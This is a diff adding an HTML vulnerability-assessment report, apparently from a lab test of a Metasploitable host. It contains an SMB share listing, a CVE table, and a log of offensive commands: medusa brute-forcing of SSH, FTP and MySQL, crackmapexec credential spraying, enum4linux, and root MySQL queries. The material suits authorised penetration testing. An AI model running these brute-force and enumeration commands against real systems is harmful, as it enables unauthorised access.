+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	tmp             Disk      oh noes!
+	opt             Disk      
+	IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+	msfadmin        Disk      Home Directories
+Reconnecting with SMB1 for workgroup listing.
+
+	Server               Comment
+	---------            -------
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            METASPLOITABLE</div></div>
+            </div>
+            <div class="module-card" style="border-color:rgba(6,214,160,.3)">
+              <div class="module-card-header" style="border-bottom-color:rgba(6,214,160,.3)">
+                <span style="font-size:16px">🗄</span>
+                <span class="service-name" style="color:#06d6a0">MySQL</span>
+                <span style="font-family:var(--mono);font-size:10px;color:var(--text3);margin-left:8px">172.20.10.2</span>
+                <span class="status-pill pill-cred" style="margin-left:auto">root</span>
+              </div>
+              <div class="module-card-body">
+                <div class="proof-label">Version</div>
+                <div class="proof-block"></div>
+                <div class="proof-label" style="margin-top:10px">Databases</div>
+                <div class="proof-block"></div>
+                <div class="proof-label" style="margin-top:10px">MySQL Users</div>
+                <div class="proof-block"></div>
+                <div class="proof-label" style="margin-top:10px">Tables (first non-system DB)</div>
+                <div class="proof-block">(none found)</div></div>
+            </div></div>
+  </div>
+  
+  
+  <div class="section" id="cves">
+    <div class="section-header">
+      <div class="section-icon">🛡</div>
+      <div class="section-title">CVE Findings</div>
+      <span class="section-badge pill-found">16 CVEs</span>
+    </div>
+    <div style="background:var(--panel);border:1px solid var(--border);border-radius:3px;overflow:hidden;">
+      <table class="cve-table">
+        <thead><tr><th>CVE ID ↗ NVD</th><th>Severity</th><th>Description &amp; References</th><th>Published</th></tr></thead>
+        <tbody><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2021-27171" target="_blank" rel="noopener">CVE-2021-27171</a></td>
+      <td><span class="score-badge sev-critical">CRITICAL 9.8</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:98%;background:#ff4d4d"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">An issue was discovered on FiberHome HG6245D devices through RP2613. It is possible to start a Linux telnetd as root on port 26/tc…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html#telnet-cli-privilege-escalation" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="https://pierrekim.github.io/blog/2021-01-12-fiberhome-ont-0day-vulnerabilities.html#telnet-cli-privilege-escalation" target="_blank" rel="noopener">ref 2 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2021-02-10</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2020-1938" target="_blank" rel="noopener">CVE-2020-1938</a></td>
+      <td><span class="score-badge sev-critical">CRITICAL 9.8</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:98%;background:#ff4d4d"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat. Tomcat treats …<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://lists.opensuse.org/opensuse-security-announce/2020-03/msg00025.html" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://lists.opensuse.org/opensuse-security-announce/2020-05/msg00002.html" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://support.blackberry.com/kb/articleDetail?articleNumber=000062739" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2020-02-24</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2024-54141" target="_blank" rel="noopener">CVE-2024-54141</a></td>
+      <td><span class="score-badge sev-high">HIGH 8.6</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:86%;background:#ff8c42"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">phpMyFAQ is an open source FAQ web application for PHP 8.1+ and MySQL, PostgreSQL and other databases. Prior to 4.0.0, phpMyFAQ ex…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="https://github.com/thorsten/phpMyFAQ/commit/b9289a0b2233df864361c131cd177b6715fbb0fe" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="https://github.com/thorsten/phpMyFAQ/security/advisories/GHSA-vrjr-p3xp-xx2x" target="_blank" rel="noopener">ref 2 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2024-12-06</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2009-0542" target="_blank" rel="noopener">CVE-2009-0542</a></td>
+      <td><span class="score-badge sev-high">HIGH 7.5</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:75%;background:#ff8c42"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">SQL injection vulnerability in ProFTPD Server 1.3.1 through 1.3.2rc2 allows remote attackers to execute arbitrary SQL commands via…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://bugs.proftpd.org/show_bug.cgi?id=3180" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://secunia.com/advisories/34268" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://security.gentoo.org/glsa/glsa-200903-27.xml" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2009-02-12</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2000-1195" target="_blank" rel="noopener">CVE-2000-1195</a></td>
+      <td><span class="score-badge sev-high">HIGH 7.5</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:75%;background:#ff8c42"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">telnet daemon (telnetd) from the Linux netkit package before netkit-telnet-0.16 allows remote attackers to bypass authentication w…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://www.caldera.com/support/security/advisories/CSSA-2000-008.0.txt" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="https://exchange.xforce.ibmcloud.com/vulnerabilities/4225" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://www.caldera.com/support/security/advisories/CSSA-2000-008.0.txt" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2001-08-31</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2022-39028" target="_blank" rel="noopener">CVE-2022-39028</a></td>
+      <td><span class="score-badge sev-high">HIGH 7.5</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:75%;background:#ff8c42"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">telnetd in GNU Inetutils through 2.3, MIT krb5-appl through 1.0.3, and derivative works has a NULL pointer dereference via 0xff 0x…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="https://git.hadrons.org/cgit/debian/pkgs/inetutils.git/commit/?id=113da8021710d871c7dd72d2a4d5615d42d64289" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="https://lists.debian.org/debian-lts-announce/2022/11/msg00033.html" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="https://lists.gnu.org/archive/html/bug-inetutils/2022-08/msg00002.html" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2022-08-30</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2007-6601" target="_blank" rel="noopener">CVE-2007-6601</a></td>
+      <td><span class="score-badge sev-high">HIGH 7.2</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:72%;background:#ff8c42"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">The DBLink module in PostgreSQL 8.2 before 8.2.6, 8.1 before 8.1.11, 8.0 before 8.0.15, 7.4 before 7.4.19, and 7.3 before 7.3.21, …<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01420154" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://lists.opensuse.org/opensuse-security-announce/2008-02/msg00000.html" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://secunia.com/advisories/28359" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2008-01-09</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2007-3278" target="_blank" rel="noopener">CVE-2007-3278</a></td>
+      <td><span class="score-badge sev-medium">MEDIUM 6.9</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:69%;background:#ffd166"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">PostgreSQL 8.1 and probably later versions, when local trust authentication is enabled and the Database Link library (dblink) is i…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://h20000.www2.hp.com/bizsupport/TechSupport/Document.jsp?objectID=c01420154" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://osvdb.org/40899" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://secunia.com/advisories/28376" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2007-06-19</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2008-4242" target="_blank" rel="noopener">CVE-2008-4242</a></td>
+      <td><span class="score-badge sev-medium">MEDIUM 6.8</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:68%;background:#ffd166"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">ProFTPD 1.3.1 interprets long commands from an FTP client as multiple commands, which allows remote attackers to conduct cross-sit…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://bugs.proftpd.org/show_bug.cgi?id=3115" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://secunia.com/advisories/31930" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://secunia.com/advisories/33261" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2008-09-25</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2009-0543" target="_blank" rel="noopener">CVE-2009-0543</a></td>
+      <td><span class="score-badge sev-medium">MEDIUM 6.8</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:68%;background:#ffd166"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">ProFTPD Server 1.3.1, with NLS support enabled, allows remote attackers to bypass SQL injection protection mechanisms via invalid,…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://bugs.proftpd.org/show_bug.cgi?id=3173" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://secunia.com/advisories/34268" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://security.gentoo.org/glsa/glsa-200903-27.xml" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2009-02-12</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2020-8797" target="_blank" rel="noopener">CVE-2020-8797</a></td>
+      <td><span class="score-badge sev-medium">MEDIUM 6.7</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:67%;background:#ffd166"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">Juplink RX4-1500 v1.0.3 allows remote attackers to gain root access to the Linux subsystem via an unsanitized exec call (aka Comma…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="https://cerne.xyz/bugs/CVE-2020-8797.html" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="https://cerne.xyz/bugs/CVE-2020-8797.html" target="_blank" rel="noopener">ref 2 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2020-04-23</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2006-6563" target="_blank" rel="noopener">CVE-2006-6563</a></td>
+      <td><span class="score-badge sev-medium">MEDIUM 6.6</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:65%;background:#ffd166"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">Stack-based buffer overflow in the pr_ctrls_recv_request function in ctrls.c in the mod_ctrls module in ProFTPD before 1.3.1rc1 al…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://secunia.com/advisories/23371" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://secunia.com/advisories/23392" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://secunia.com/advisories/23473" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2006-12-15</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2012-1151" target="_blank" rel="noopener">CVE-2012-1151</a></td>
+      <td><span class="score-badge sev-medium">MEDIUM 5.0</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:50%;background:#ffd166"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">Multiple format string vulnerabilities in dbdimp.c in DBD::Pg (aka DBD-Pg or libdbd-pg-perl) module before 2.19.0 for Perl allow r…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=661536" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://cpansearch.perl.org/src/TURNSTEP/DBD-Pg-2.19.1/Changes" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://rhn.redhat.com/errata/RHSA-2012-1116.html" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2012-09-09</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2008-5161" target="_blank" rel="noopener">CVE-2008-5161</a></td>
+      <td><span class="score-badge sev-low">LOW 2.6</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:26%;background:#06d6a0"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">Error handling in the SSH protocol in (1) SSH Tectia Client and Server and Connector 4.0 through 4.4.11, 5.0 through 5.2.4, and 5.…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://isc.sans.org/diary.html?storyid=5366" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://kb.juniper.net/InfoCenter/index?page=content&amp;id=JSA10705" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://lists.apple.com/archives/security-announce/2009/Nov/msg00000.html" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2008-11-19</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2000-1247" target="_blank" rel="noopener">CVE-2000-1247</a></td>
+      <td><span class="score-badge sev-low">LOW 2.1</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:21%;background:#06d6a0"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">The default configuration of the jserv-status handler in jserv.conf in Apache JServ 1.1.2 includes an &quot;allow from 127.0.0.1&quot; line,…<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="http://archive.apache.org/dist/java/java.apache.org-www.tar.gz" target="_blank" rel="noopener">ref 1 ↗</a><a class="ref-link" href="http://marc.info/?l=java-apache-users&amp;m=97036799917909&amp;w=2" target="_blank" rel="noopener">ref 2 ↗</a><a class="ref-link" href="http://securityreason.com/securityalert/8412" target="_blank" rel="noopener">ref 3 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2011-10-05</td>
+    </tr><tr>
+      <td class="cve-id-cell"><a class="cve-link" href="https://nvd.nist.gov/vuln/detail/CVE-2025-10702" target="_blank" rel="noopener">CVE-2025-10702</a></td>
+      <td><span class="score-badge sev-na">N/A 0.0</span>
+        <div class="score-bar"><div class="score-bar-fill" style="width:0%;background:#06d6a0"></div></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text2)">Improper Control of Generation of Code ('Code Injection') vulnerability in Progress DataDirect Connect for JDBC drivers, Progress …<div style='margin-top:6px;display:flex;flex-wrap:wrap;gap:4px'><a class="ref-link" href="https://community.progress.com/s/article/Progress-DataDirect-Critical-Security-Product-Alert-Bulletin-November-2025" target="_blank" rel="noopener">ref 1 ↗</a></div></td>
+      <td style="font-family:var(--mono);font-size:10px;color:var(--text3);white-space:nowrap">2025-11-19</td>
+    </tr></tbody>
+      </table>
+    </div>
+  </div>
+  <div class="section" id="commands">
+    <div class="section-header">
+      <div class="section-icon">$</div>
+      <div class="section-title">Commands Executed</div>
+    </div>
+    <div class="terminal">
+      <div class="terminal-bar">
+        <div class="t-dot t-red"></div><div class="t-dot t-yellow"></div><div class="t-dot t-green"></div>
+        <div class="terminal-label">linnet — bash session</div>
+      </div>
+      <div class="terminal-body"><div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">nmap -p22 -T4 --script ssh-auth-methods,ssh-hostkey 172.20.10.2</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">python3 /root/ssh-audit/ssh-audit.py 172.20.10.2 || true</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">medusa -h 172.20.10.2 -U /root/Linux-VAPT-Tool/username.txt -P /root/Linux-VAPT-Tool/password.txt -M ssh -t 8</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">nmap -p21 -T4 --script ftp-anon,ftp-syst 172.20.10.2</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">medusa -h 172.20.10.2 -U /root/Linux-VAPT-Tool/username.txt -P /root/Linux-VAPT-Tool/password.txt -M ftp -t 8</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">enum4linux -a 172.20.10.2</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">crackmapexec smb 172.20.10.2 -u /root/Linux-VAPT-Tool/username.txt -p /root/Linux-VAPT-Tool/password.txt --shares</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">smbclient -L //172.20.10.2 -U msfadmin%***</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">nmap -p3306 -T4 --script mysql-info,mysql-enum 172.20.10.2</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">medusa -h 172.20.10.2 -U /root/Linux-VAPT-Tool/username.txt -P /root/Linux-VAPT-Tool/password.txt -M mysql -t 8</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">mysql -h 172.20.10.2 -u root -e &quot;SHOW DATABASES;&quot;</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">mysql -h 172.20.10.2 -u root -e &quot;SELECT VERSION();&quot;</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">mysql -h 172.20.10.2 -u root -e &quot;SELECT user, host FROM mysql.user LIMIT 10;&quot;</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">nmap -sV --version-intensity 5 -T4 --open 172.20.10.2</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=ProFTPD%201.3.1&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=OpenSSH%204.7p1&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Linux%20telnetd&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Postfix%20smtpd&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=ISC%20BIND&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache%20httpd&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Samba%20smbd&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Samba%20smbd&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=MySQL%205.0.51a-3ubuntu5&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=PostgreSQL%20DB&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache%20Jserv&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">NVD API -&gt; https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=Apache%20Tomcat/Coyote&amp;resultsPerPage=5</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">searchsploit CVE-2021-27171 || true</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">searchsploit CVE-2020-1938 || true</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">searchsploit CVE-2024-54141 || true</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">searchsploit CVE-2009-0542 || true</span></div>
+<div><span class="t-prompt">linnet@kali:~$ </span><span class="t-cmd">searchsploit CVE-2000-1195 || true</span></div>
+</div>
+    </div>
+  </div>
+  <div class="report-footer">
+    <div class="footer-brand">LINNET</div>
+    <div class="footer-info">Linux Network VAPT Framework v2.1 &nbsp;|&nbsp; 2026-04-20 10:56:34 &nbsp;|&nbsp; Target: 172.20.10.2</div>
+  </div>
+</main>
+</body>
+</html>
